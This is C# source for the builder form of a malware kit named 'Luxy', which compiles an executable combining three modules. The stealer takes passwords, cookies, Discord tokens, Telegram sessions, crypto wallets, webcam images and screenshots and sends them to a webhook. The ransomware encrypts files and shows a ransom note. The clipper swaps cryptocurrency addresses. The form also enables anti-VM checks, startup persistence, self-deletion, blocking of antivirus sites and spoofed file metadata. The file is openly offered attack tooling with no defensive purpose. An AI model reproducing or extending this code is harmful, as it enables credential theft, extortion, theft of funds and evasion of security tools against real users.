using System;
using System.Windows.Forms;
using System.Threading;

namespace Luxy
{
    public partial class BuilderForm : Form
    {
        StealerForm stealerForm = new StealerForm();
        RansomewareForm ransomewareForm = new RansomewareForm();
        ClipperForm clipperForm = new ClipperForm();

        public BuilderForm()
        {
            InitializeComponent();
        }

        private void build_btn_Click(object sender, EventArgs e)
        {
            var stealer_settings = stealerForm.Stealer_settings;
            var ransomware_settings_bool = ransomewareForm.Ransomware_settings_bool;
            var ransomware_settings_string = ransomewareForm.Ransomware_settings_string;
            var clipper_settings = clipperForm.Clipper_settings;

            Settings.StealerModule = stealer_ts.Checked;
            Settings.RansomewareModule = ransomeware_ts.Checked;
            Settings.ClipperModule = clipper_ts.Checked;

            if (webhook_stealer_url_tb.Text == "" && Settings.StealerModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("Webhook can not be empty.", "Warning");
                return;
            }

            if (webhook_ransomware_tb.Text == "" && Settings.RansomewareModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("Webhook can not be empty.", "Warning");
                return;
            }

            if (!Settings.StealerModule && !Settings.RansomewareModule && !Settings.ClipperModule)
            {
                GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Warning;
                GunaMessageBox.Show("There is no module enabled.", "Warning");
                return;
            }

            Settings.WebhookStealer = webhook_stealer_url_tb.Text;
            Settings.StealPasswords = stealer_settings[0];
            Settings.StealCookies = stealer_settings[1];
            Settings.StealDiscordToken = stealer_settings[2];
            Settings.StealGames = stealer_settings[3];
            Settings.StealTelegramSessions = stealer_settings[4];
            Settings.StealSystemInfo = stealer_settings[5];
            Settings.Netwrok = stealer_settings[6];
            Settings.StealWallets = stealer_settings[7];
            Settings.TakeWebcam = stealer_settings[8];
            Settings.TakeScreenshot = stealer_settings[9];

            Settings.WebhookRansomeware = webhook_ransomware_tb.Text;
            Settings.EncryptExtension = ransomware_settings_string[0];
            Settings.EncryptExtensionList = ransomware_settings_string[1];
            Settings.ReadMeMessage = ransomware_settings_string[2];
            Settings.ShowReadMeMessage = ransomware_settings_bool[0];

            Settings.WebhookClipper = webhook_clipper_tb.Text;
            Settings.BtcAddr = clipper_settings["btc"].Item1;
            Settings.BtcClip = clipper_settings["btc"].Item2;
            Settings.EthAddr = clipper_settings["eth"].Item1;
            Settings.EthClip = clipper_settings["eth"].Item2;
            Settings.DogeAddr = clipper_settings["doge"].Item1;
            Settings.DogeClip = clipper_settings["doge"].Item2;
            Settings.LtcAddr = clipper_settings["ltc"].Item1;
            Settings.LtcClip = clipper_settings["ltc"].Item2;
            Settings.DashAddr = clipper_settings["dash"].Item1;
            Settings.DashClip = clipper_settings["dash"].Item2;
            Settings.XmrAddr = clipper_settings["xmr"].Item1;
            Settings.XmrClip = clipper_settings["xmr"].Item2;
            Settings.BchAddr = clipper_settings["bch"].Item1;
            Settings.BchClip = clipper_settings["bch"].Item2;

            Settings.AntiVm = anti_vm_ts.Checked;
            Settings.Startup = startup_ts.Checked;
            Settings.Melt = melt_ts.Checked;
            Settings.BlockAvSites = block_av_sites_ts.Checked;

            Settings.CompanyName = company_tb.Text;
            Settings.Description = description_tb.Text;
            Settings.ProductName = product_tb.Text;
            Settings.LegalCopyright = company_tb.Text;
            Settings.LegalTrademarks = trademarks_tb.Text;
            Settings.InternalName = internal_tb.Text;
            Settings.OriginalFilename = original_name_tb.Text;

            Settings.IconPath = icon_path_tb.Text;

            var fileDialog = new SaveFileDialog();
            fileDialog.Title = "Build";
            fileDialog.Filter = "Excutable file (*.exe)|*.exe";
            fileDialog.DefaultExt = "exe";
            fileDialog.FileName = "Luxy.exe";
            if (fileDialog.FileName == "" || fileDialog.ShowDialog() == DialogResult.Cancel)
            {
                return;
            }
            Thread buildTh = new Thread(() => Components.Builder.Builder.Build(fileDialog.FileName));
            buildTh.IsBackground = true;
            buildTh.Start();
            //Components.Builder.Builder.Build(fileDialog.FileName, progressBar);
        }

        private void setting_setealer_btn_Click(object sender, EventArgs e)
        {
            stealerForm.ShowDialog();
        }

        private void setting_ransomware_btn_Click(object sender, EventArgs e)
        {
            ransomewareForm.ShowDialog();
        }

        private void check_webhook_btn_Click(object sender, EventArgs e)
        {
            string message = @"{
                ""content"": ""This Webhook is Working!""
                }";
            Webhook.PostJson(webhook_stealer_url_tb.Text, message);
            GunaMessageBox.Buttons = Guna.UI2.WinForms.MessageDialogButtons.OK;
            GunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information;
            GunaMessageBox.Show("Check Webhook Message in your server!", "Webhook");
        }

        private void select_icon_btn_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog();
            fileDialog.Filter = "ico files (*.ico)|*.ico";
            fileDialog.Title = "Select Icon";
            fileDialog.ShowDialog();
            if (fileDialog.FileName == "")
            {
                return;
            }
            icon_path_tb.Text = fileDialog.FileName;
        }

        private void setting_clipper_btn_Click(object sender, EventArgs e)
        {
            clipperForm.ShowDialog();
        }
    }
}
